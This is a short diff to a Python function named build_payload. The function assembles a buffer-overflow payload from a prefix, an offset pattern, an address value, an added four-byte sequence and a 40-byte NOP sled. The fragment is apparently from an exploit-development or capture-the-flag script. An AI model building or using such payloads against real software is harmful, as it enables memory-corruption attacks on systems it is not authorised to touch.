@@ -31,6 +31,7 @@ def build_payload():
     payload  = b'meow '
     payload += pattern
     payload += va
+    payload += b'\x87\x87\x87\x87'
     payload += b'\x90' * 40
     return payload
 
